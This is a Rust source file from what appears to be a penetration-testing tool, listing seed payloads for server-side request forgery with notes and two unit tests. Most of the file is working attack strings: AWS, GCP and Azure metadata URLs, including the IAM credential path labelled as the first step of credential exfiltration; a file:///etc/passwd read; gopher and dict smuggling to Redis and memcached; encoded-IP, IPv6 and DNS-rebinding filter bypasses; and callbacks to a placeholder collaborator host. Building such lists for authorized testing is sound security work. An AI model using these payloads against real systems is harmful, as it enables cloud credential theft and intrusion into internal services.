//! SSRF seed payloads — internal targets, metadata services, bypass
//! tricks. The substring `OAST.SITE` is a placeholder the primitive
//! crate replaces with the engagement's collaborator host before
//! sending.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Ssrf;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "http://OAST.SITE/",
        notes: "OAST callback probe — confirms outbound SSRF without needing reflection",
        tags: &["oast", "probe"],
    },
    Payload {
        category: C,
        value: "http://127.0.0.1/",
        notes: "loopback probe — bypasses external-only filters",
        tags: &["internal", "loopback"],
    },
    Payload {
        category: C,
        value: "http://localhost/",
        notes: "loopback by name — sometimes resolves where IP is blocked",
        tags: &["internal", "loopback"],
    },
    Payload {
        category: C,
        value: "http://169.254.169.254/latest/meta-data/",
        notes: "AWS IMDSv1 — instance metadata; high-impact when reachable",
        tags: &["aws", "metadata", "high-impact"],
    },
    Payload {
        category: C,
        value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        notes: "AWS IAM role credential listing — first step of credential exfil",
        tags: &["aws", "metadata", "exfil", "high-impact"],
    },
    Payload {
        category: C,
        value: "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        notes: "GCP metadata — requires `Metadata-Flavor: Google` header but worth probing",
        tags: &["gcp", "metadata", "high-impact"],
    },
    Payload {
        category: C,
        value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        notes: "Azure IMDS — requires `Metadata: true` header",
        tags: &["azure", "metadata", "high-impact"],
    },
    Payload {
        category: C,
        value: "http://[::1]/",
        notes: "IPv6 loopback — bypasses IPv4-only filters",
        tags: &["internal", "ipv6", "loopback"],
    },
    Payload {
        category: C,
        value: "http://0.0.0.0/",
        notes: "0.0.0.0 — routes to localhost on Linux; bypass for `127.*` blocklist",
        tags: &["internal", "loopback"],
    },
    Payload {
        category: C,
        value: "http://2130706433/",
        notes: "decimal IP for 127.0.0.1 — bypass for textual loopback filters",
        tags: &["internal", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "http://0x7f000001/",
        notes: "hex IP for 127.0.0.1",
        tags: &["internal", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "http://0177.0.0.1/",
        notes: "octal IP for 127.0.0.1",
        tags: &["internal", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "gopher://127.0.0.1:6379/_INFO%0a",
        notes: "gopher → Redis — INFO is read-only; safe probe",
        tags: &["internal", "redis", "protocol-smuggle"],
    },
    Payload {
        category: C,
        value: "file:///etc/passwd",
        notes: "file:// scheme — works in libcurl-backed clients with file support",
        tags: &["internal", "file"],
    },
    Payload {
        category: C,
        value: "dict://127.0.0.1:11211/stats",
        notes: "dict → memcached — stats command",
        tags: &["internal", "memcached", "protocol-smuggle"],
    },
    Payload {
        category: C,
        value: "http://OAST.SITE@127.0.0.1/",
        notes: "userinfo confusion — some parsers honor host vs userinfo differently",
        tags: &["filter-bypass", "parser"],
    },
    Payload {
        category: C,
        value: "http://127.0.0.1.OAST.SITE/",
        notes: "DNS pinning bypass — host matches blocklist but A-record resolves externally",
        tags: &["dns-rebind", "filter-bypass"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_ssrf_class() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Ssrf);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_cloud_metadata_payloads() {
        for cloud in ["aws", "gcp", "azure"] {
            assert!(
                PAYLOADS
                    .iter()
                    .any(|p| p.tags.contains(&cloud) && p.tags.contains(&"metadata")),
                "no metadata payload for {}",
                cloud
            );
        }
    }
}
